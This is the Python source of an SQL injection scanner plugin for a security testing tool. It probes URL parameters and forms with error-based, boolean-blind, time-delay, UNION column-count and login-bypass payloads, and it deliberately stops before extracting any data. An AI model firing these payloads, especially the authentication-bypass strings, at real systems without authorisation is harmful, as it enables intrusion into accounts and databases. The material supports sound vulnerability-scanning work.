"""
SQL Injection plugin (v3).

Incorporates techniques from a manual pentest methodology guide the
project owner sourced separately, adapted to this codebase's safety
model. Two things from that guide were deliberately NOT implemented —
see the bottom of this docstring for why.

Vectors tested:
  - Query parameters on the target URL.
  - Every <form> on the target page — GET, and POST tried as both
    form-encoded AND JSON body (many modern apps accept either;
    trying both roughly doubles coverage on POST endpoints for one
    extra request per check).

Techniques (each still gated by `techniques` in config; time-blind and
UNION additionally gated by `engagement.allow_active_payloads`):
  - error-based:    multi-DBMS signatures (MySQL, PostgreSQL, MSSQL,
                     SQLite, Oracle) plus framework debug-page leaks
                     (Werkzeug/Flask, Django, Laravel) that often
                     surface a raw SQL error even when the app's own
                     error handling would otherwise hide it.
  - boolean-blind:   TRUE/FALSE comparison with dynamic content
                     (long digit runs — timestamps, nonces) stripped
                     before comparing, plus a second TRUE payload
                     ("'2'='2") to confirm the difference is real and
                     not WAF/rate-limit noise.
  - time-blind:      MySQL/MariaDB, PostgreSQL, and MSSQL delay payloads.
  - auth-bypass:      only runs on forms that look like a login form
                      (a password-type field present). Tries a short
                      list of classic bypass payloads on the
                      username-like field and checks for a
                      success signal. This is a single non-destructive
                      login attempt per payload — it proves the bypass
                      exists; it does not go on to browse the
                      authenticated session or extract anything.
  - union-confirm:    only after error-based confirms a field is
                      injectable. Probes column counts 1-10 to report
                      *how many columns* a UNION would need — this
                      proves the injection is exploitable for data
                      extraction without this tool actually
                      extracting any data. See note below.

False-positive guard: every error-based/boolean-blind finding is
checked against a baseline (unmodified) request first — if the
"vulnerable" signal is already present with no payload injected at
all, it's almost certainly WAF/app noise, not SQLi, and is skipped.

--------------------------------------------------------------------
What this plugin intentionally does NOT do, even with
allow_active_payloads: true:
  - It does not extract table/column names or row data via UNION
    (version(), string_agg(), information_schema queries, etc.).
    Confirming injectability + column count is enough to prove the
    vulnerability and hand off to a human for authorized, scoped
    extraction (e.g. sqlmap under your own supervision) — actually
    pulling credentials or user data is a materially bigger action
    than "detect a vulnerability" and isn't something this scanner
    takes automatically.
  - It does not attempt second-order SQLi (register a payload, then
    trigger it later via login). That requires creating persistent
    accounts/data on the target and chaining two separate write
    operations together, which is a meaningfully more invasive,
    stateful action than every other check in this plugin — worth
    doing by hand, with your eyes on each step, not automated.
--------------------------------------------------------------------
"""

from __future__ import annotations

import re
import time

from stelarstrike.core.report import Finding
from stelarstrike.plugins.base import VulnerabilityPlugin
from stelarstrike.utils.http_client import build_url_with_params, extract_forms, get_query_params
from stelarstrike.utils.logger import get_logger

log = get_logger(__name__)

_ERROR_SIGNATURES = [
    # MySQL / MariaDB
    "you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
    "mysqli_fetch_array()", "mysqli::", "valid mysql result",
    "check the manual that corresponds",
    # PostgreSQL
    "pg_query", "pg_exec", "syntax error at or near", "unterminated quoted string",
    "invalid input syntax", "null value in column", "violates",
    # SQLite
    "sqlite3.operationalerror", "sqlite_error", "unrecognized token",
    "sqlite3::sqlexception", "no such table",
    # SQL Server / MSSQL
    "unclosed quotation mark", "quoted string not properly terminated",
    "microsoft ole db provider", "incorrect syntax near", "sqlstate",
    "system.data.sqlclient",
    # Oracle
    "ora-01756", "ora-00933", "ora-00921",
    # Generic ORM / driver / framework leaks
    "sqlalchemy.exc", "psycopg2.", "django.db.utils", "org.hibernate",
    "syntax error in sql statement", "operationalerror", "programmingerror",
    "integrityerror", "database error", "query failed",
    # Framework debug pages (often leak the query even without a "true" DB error)
    "werkzeug", "traceback (most recent call last)", "technical 500",
    "whoops, looks like something went wrong", "ignition",
]

_ERROR_PROBES = [
    ("'", "string"),
    ('"', "string"),
    ("' OR '1'='1", "string"),
    (" OR 1=1", "numeric"),
]

_TIME_PAYLOADS = [
    ("' OR SLEEP({delay})-- -", "mysql/mariadb"),
    (" OR SLEEP({delay})-- -", "mysql/mariadb (numeric)"),
    ("'; SELECT pg_sleep({delay})-- -", "postgresql"),
    (" OR (SELECT pg_sleep({delay}))-- -", "postgresql (numeric)"),
    ("'; WAITFOR DELAY '0:0:{delay}'-- -", "mssql"),
    (" WAITFOR DELAY '0:0:{delay}'-- -", "mssql (numeric)"),
]

_AUTH_BYPASS_PAYLOADS = [
    "' OR 1=1-- -",
    "' OR '1'='1'-- -",
    "admin'-- -",
    "' OR 1=1#",
    "') OR 1=1-- -",
]

_LOGIN_FAILURE_KEYWORDS = ["invalid", "incorrect", "failed", "denied", "wrong password", "not found"]
_LOGIN_SUCCESS_KEYWORDS = ["welcome", "dashboard", "logout", "\"success\"", "'success'", "token"]

_DYNAMIC_CONTENT_RE = re.compile(r"\d{8,}")  # strips long digit runs: timestamps, nonces, session-ish IDs


class SQLiPlugin(VulnerabilityPlugin):
    id = "sqli"
    name = "SQL Injection"
    default_severity = "high"

    async def run(self) -> list[Finding]:
        findings: list[Finding] = []
        techniques = self.options.get("techniques", ["error-based", "boolean-blind", "time-blind"])

        # Vector 1: query parameters on the URL itself
        params = get_query_params(self.target_url)
        for param in params:
            findings += await self._test_vector(
                techniques=techniques,
                vector_label=f"query param '{param}'",
                url=self.target_url,
                method="get",
                body_type="query",
                base_values=params,
                field=param,
            )

        # Vector 2: every form on the page
        try:
            page_resp = await self.get(self.target_url)
            forms = extract_forms(page_resp.text)
        except Exception as exc:  # noqa: BLE001
            log.debug(f"sqli: could not fetch/parse '{self.target_url}' for forms: {exc}")
            forms = []

        for form in forms:
            action = form["action"] or self.target_url
            action_url = action if action.startswith("http") else self.target_url
            base_values = {i["name"]: i.get("value") or "test" for i in form["inputs"] if i["name"]}
            if not base_values:
                continue

            is_login_form = any(i["type"] == "password" for i in form["inputs"])

            if form["method"] == "get":
                for field in base_values:
                    findings += await self._test_vector(
                        techniques=techniques,
                        vector_label=f"form field '{field}' (GET {action_url})",
                        url=action_url,
                        method="get",
                        body_type="query",
                        base_values=base_values,
                        field=field,
                    )
            else:
                # POST forms: test as both form-encoded and JSON body — many
                # modern apps accept either, and we only know from the HTML
                # which one the browser would send, not which one the
                # server-side handler actually parses.
                for body_type in ("form", "json"):
                    for field in base_values:
                        findings += await self._test_vector(
                            techniques=techniques,
                            vector_label=f"form field '{field}' (POST {body_type} {action_url})",
                            url=action_url,
                            method="post",
                            body_type=body_type,
                            base_values=base_values,
                            field=field,
                        )

            if is_login_form and "error-based" in techniques:
                username_field = next(
                    (i["name"] for i in form["inputs"] if i["type"] != "password" and i["name"]),
                    None,
                )
                if username_field:
                    for body_type in ("form", "json"):
                        f = await self._check_auth_bypass(
                            action_url, form["method"], body_type, base_values, username_field
                        )
                        if f:
                            findings.append(f)
                            break  # confirmed via one encoding, no need to double-report

        return findings

    async def _test_vector(
        self,
        techniques: list[str],
        vector_label: str,
        url: str,
        method: str,
        body_type: str,
        base_values: dict[str, str],
        field: str,
    ) -> list[Finding]:
        findings: list[Finding] = []
        log.debug(f"sqli: testing {vector_label}")

        if "error-based" in techniques:
            f = await self._check_error_based(vector_label, url, method, body_type, base_values, field)
            if f:
                findings.append(f)
                if self.ctx.allow_active_payloads:
                    union_f = await self._check_union_column_count(
                        vector_label, url, method, body_type, base_values, field
                    )
                    if union_f:
                        findings.append(union_f)
                return findings  # confirmed — skip blind checks on this field

        if "boolean-blind" in techniques:
            f = await self._check_boolean_blind(vector_label, url, method, body_type, base_values, field)
            if f:
                findings.append(f)
                return findings

        if "time-blind" in techniques and self.ctx.allow_active_payloads:
            f = await self._check_time_blind(vector_label, url, method, body_type, base_values, field)
            if f:
                findings.append(f)

        return findings

    async def _send(self, url: str, method: str, body_type: str, values: dict[str, str]):
        if method == "get":
            return await self.get(build_url_with_params(url, values))
        if body_type == "json":
            return await self.post(url, json=values)
        return await self.post(url, data=values)

    @staticmethod
    def _strip_dynamic(text: str) -> str:
        return _DYNAMIC_CONTENT_RE.sub("", text)

    async def _check_error_based(
        self, vector_label: str, url: str, method: str, body_type: str, base_values: dict[str, str], field: str
    ) -> Finding | None:
        try:
            baseline_resp = await self._send(url, method, body_type, base_values)
        except Exception as exc:  # noqa: BLE001
            log.debug(f"sqli: baseline request failed for {vector_label}: {exc}")
            return None
        baseline_lower = baseline_resp.text.lower()

        for suffix, context in _ERROR_PROBES:
            test_values = dict(base_values)
            test_values[field] = f"{base_values[field]}{suffix}"
            try:
                resp = await self._send(url, method, body_type, test_values)
            except Exception as exc:  # noqa: BLE001
                log.debug(f"sqli: request failed for {vector_label} [{context}]: {exc}")
                continue

            body_lower = resp.text.lower()
            log.debug(
                f"sqli: error-based probe on {vector_label} [{context}] "
                f"-> HTTP {resp.status_code}, {len(resp.text)} bytes"
            )
            for sig in _ERROR_SIGNATURES:
                if sig in body_lower:
                    if sig in baseline_lower:
                        log.debug(
                            f"sqli: signature '{sig}' also present in baseline for "
                            f"{vector_label} — false positive, skipping."
                        )
                        continue
                    return self.finding(
                        title=f"SQL Injection (error-based, {context} context)",
                        url=url,
                        parameter=field,
                        evidence=f"{vector_label}: injected suffix {suffix!r} -> DB error signature: '{sig}' (absent from baseline response)",
                        description=(
                            f"{vector_label} reflects a database error when a "
                            f"SQL-metacharacter payload is injected, and the same "
                            f"error does not appear in the unmodified baseline "
                            f"request — unsanitized input reaches a SQL query."
                        ),
                        remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
                        confidence="high",
                        cwe="CWE-89",
                    )
        return None

    async def _check_boolean_blind(
        self, vector_label: str, url: str, method: str, body_type: str, base_values: dict[str, str], field: str
    ) -> Finding | None:
        contexts = [
            ("' OR '1'='1", "' OR '2'='2", "' AND '1'='2", "string"),
            (" OR 1=1", " OR 2=2", " AND 1=2", "numeric"),
        ]
        for true1_suffix, true2_suffix, false_suffix, context in contexts:
            true1_values = dict(base_values)
            true1_values[field] = f"{base_values[field]}{true1_suffix}"
            true2_values = dict(base_values)
            true2_values[field] = f"{base_values[field]}{true2_suffix}"
            false_values = dict(base_values)
            false_values[field] = f"{base_values[field]}{false_suffix}"

            try:
                true1_resp = await self._send(url, method, body_type, true1_values)
                true2_resp = await self._send(url, method, body_type, true2_values)
                false_resp = await self._send(url, method, body_type, false_values)
            except Exception as exc:  # noqa: BLE001
                log.debug(f"sqli: boolean-blind request failed for {vector_label} [{context}]: {exc}")
                continue

            log.debug(
                f"sqli: boolean-blind on {vector_label} [{context}] -> "
                f"TRUE1: HTTP {true1_resp.status_code}/{len(true1_resp.text)}b, "
                f"TRUE2: HTTP {true2_resp.status_code}/{len(true2_resp.text)}b, "
                f"FALSE: HTTP {false_resp.status_code}/{len(false_resp.text)}b"
            )

            # WAF/rate-limit guard: if either TRUE probe got blocked, don't trust this round.
            if true1_resp.status_code in (403, 429) or true2_resp.status_code in (403, 429):
                log.debug(f"sqli: {vector_label} got 403/429 on a TRUE probe — likely WAF, skipping.")
                continue

            true1_clean = self._strip_dynamic(true1_resp.text)
            true2_clean = self._strip_dynamic(true2_resp.text)
            false_clean = self._strip_dynamic(false_resp.text)

            true_pair_consistent = (
                true1_resp.status_code == true2_resp.status_code and true1_clean == true2_clean
            )
            if not true_pair_consistent:
                log.debug(f"sqli: {vector_label} TRUE1 != TRUE2 — inconsistent, skipping (noisy target).")
                continue

            status_differs = true1_resp.status_code != false_resp.status_code
            content_differs = true1_clean != false_clean
            keyword_differs = ("error" in false_clean.lower()) != ("error" in true1_clean.lower())

            if status_differs or content_differs or keyword_differs:
                return self.finding(
                    title=f"SQL Injection (boolean-blind, {context} context)",
                    url=url,
                    parameter=field,
                    evidence=(
                        f"{vector_label}: TRUE (2 consistent payloads) -> HTTP {true1_resp.status_code}/{len(true1_resp.text)}b, "
                        f"FALSE -> HTTP {false_resp.status_code}/{len(false_resp.text)}b"
                    ),
                    description=(
                        f"{vector_label} produces a measurably different, "
                        f"internally-consistent response for logically-true vs. "
                        f"logically-false injected conditions (verified with two "
                        f"different TRUE payloads), suggesting blind SQL injection."
                    ),
                    remediation="Use parameterized queries / prepared statements.",
                    confidence="medium",
                    cwe="CWE-89",
                )
        return None

    async def _check_time_blind(
        self, vector_label: str, url: str, method: str, body_type: str, base_values: dict[str, str], field: str
    ) -> Finding | None:
        delay = int(self.options.get("time_delay_seconds", 5))

        try:
            start = time.monotonic()
            await self._send(url, method, body_type, dict(base_values))
            baseline_elapsed = time.monotonic() - start
        except Exception as exc:  # noqa: BLE001
            log.debug(f"sqli: time-blind baseline request failed for {vector_label}: {exc}")
            return None

        for payload_template, dbms in _TIME_PAYLOADS:
            payload_values = dict(base_values)
            payload_values[field] = f"{base_values[field]}{payload_template.format(delay=delay)}"

            try:
                start = time.monotonic()
                await self._send(url, method, body_type, payload_values)
                payload_elapsed = time.monotonic() - start
            except Exception as exc:  # noqa: BLE001
                log.debug(f"sqli: time-blind probe ({dbms}) failed for {vector_label}: {exc}")
                continue

            log.debug(
                f"sqli: time-blind on {vector_label} [{dbms}] -> "
                f"baseline={baseline_elapsed:.2f}s, payload={payload_elapsed:.2f}s (target delay={delay}s)"
            )

            if payload_elapsed - baseline_elapsed >= delay * 0.8:
                return self.finding(
                    title=f"SQL Injection (time-blind, {dbms})",
                    url=url,
                    parameter=field,
                    evidence=(
                        f"{vector_label}: baseline={baseline_elapsed:.2f}s, "
                        f"payload={payload_elapsed:.2f}s (target delay={delay}s, DBMS guess: {dbms})"
                    ),
                    description=(
                        f"{vector_label} introduces a measurable delay matching "
                        f"the injected sleep/delay duration, indicating time-based "
                        f"blind SQL injection against a {dbms} backend."
                    ),
                    remediation="Use parameterized queries / prepared statements.",
                    confidence="high",
                    cwe="CWE-89",
                )
        return None

    async def _check_union_column_count(
        self, vector_label: str, url: str, method: str, body_type: str, base_values: dict[str, str], field: str
    ) -> Finding | None:
        """Confirms exploitability for data extraction by finding the column count.

        Deliberately stops here — see module docstring for why this plugin
        never goes on to actually extract data via the confirmed UNION.
        """
        max_columns = 10
        for col_count in range(1, max_columns + 1):
            cols = ",".join(["NULL"] * col_count)
            test_values = dict(base_values)
            test_values[field] = f"{base_values[field]}' UNION SELECT {cols}-- -"
            try:
                resp = await self._send(url, method, body_type, test_values)
            except Exception as exc:  # noqa: BLE001
                log.debug(f"sqli: UNION probe (cols={col_count}) failed for {vector_label}: {exc}")
                continue

            body_lower = resp.text.lower()
            mismatch_signals = ["different number of columns", "each union query must have"]
            has_db_error = any(sig in body_lower for sig in _ERROR_SIGNATURES)
            has_mismatch = any(sig in body_lower for sig in mismatch_signals)

            log.debug(f"sqli: UNION probe {vector_label} cols={col_count} -> HTTP {resp.status_code}, error={has_db_error or has_mismatch}")

            if not has_db_error and not has_mismatch and resp.status_code < 500:
                return self.finding(
                    title="SQL Injection confirmed exploitable via UNION (data extraction possible)",
                    url=url,
                    parameter=field,
                    severity="critical",
                    confidence="medium",
                    evidence=f"{vector_label}: UNION SELECT with {col_count} column(s) returned no column-count error.",
                    description=(
                        f"{vector_label} accepts a UNION SELECT with {col_count} "
                        f"NULL columns without a column-count mismatch error, "
                        f"confirming the injection point can be used for full "
                        f"data extraction. This scanner stops at confirmation — "
                        f"it does not extract table/column names or row data. "
                        f"Follow up manually (e.g. with sqlmap, under your own "
                        f"supervision) if extraction is in scope for this engagement."
                    ),
                    remediation="Use parameterized queries / prepared statements. This is the highest-impact SQLi variant — prioritize the fix.",
                    cwe="CWE-89",
                )
        return None

    async def _check_auth_bypass(
        self, url: str, method: str, body_type: str, base_values: dict[str, str], username_field: str
    ) -> Finding | None:
        try:
            baseline_values = dict(base_values)
            baseline_values[username_field] = "stelarstrike_nonexistent_user"
            baseline_resp = await self._send(url, method, body_type, baseline_values)
        except Exception as exc:  # noqa: BLE001
            log.debug(f"sqli: auth-bypass baseline request failed for '{username_field}': {exc}")
            return None
        baseline_lower = baseline_resp.text.lower()

        for payload in _AUTH_BYPASS_PAYLOADS:
            test_values = dict(base_values)
            test_values[username_field] = payload
            try:
                resp = await self._send(url, method, body_type, test_values)
            except Exception as exc:  # noqa: BLE001
                log.debug(f"sqli: auth-bypass probe failed for '{username_field}' payload={payload!r}: {exc}")
                continue

            body_lower = resp.text.lower()
            log.debug(
                f"sqli: auth-bypass probe on '{username_field}' payload={payload!r} "
                f"-> HTTP {resp.status_code}, {len(resp.text)}b"
            )

            looks_like_failure = any(kw in body_lower for kw in _LOGIN_FAILURE_KEYWORDS)
            looks_like_success = any(kw in body_lower for kw in _LOGIN_SUCCESS_KEYWORDS)
            baseline_was_failure = any(kw in baseline_lower for kw in _LOGIN_FAILURE_KEYWORDS)

            differs_from_baseline_failure = baseline_was_failure and not looks_like_failure
            redirected = resp.status_code in (301, 302, 303, 307, 308) and "location" in resp.headers

            if looks_like_success or differs_from_baseline_failure or redirected:
                return self.finding(
                    title="SQL Injection authentication bypass confirmed",
                    url=url,
                    parameter=username_field,
                    severity="critical",
                    confidence="high",
                    evidence=(
                        f"username={payload!r} -> HTTP {resp.status_code}, "
                        f"response no longer matches the 'invalid credentials' baseline"
                        f"{' (redirected to ' + resp.headers.get('location', '') + ')' if redirected else ''}."
                    ),
                    description=(
                        f"Submitting a SQL injection payload as the login form's "
                        f"'{username_field}' field bypasses authentication — the "
                        f"response no longer resembles a failed-login response "
                        f"(and/or a redirect away from the login page occurs), "
                        f"while a genuinely nonexistent username correctly fails. "
                        f"This is a critical, unauthenticated compromise of any "
                        f"account reachable through this query."
                    ),
                    remediation="Use parameterized queries / prepared statements for the authentication query. Never build login WHERE clauses via string concatenation.",
                    cwe="CWE-89",
                )
        return None
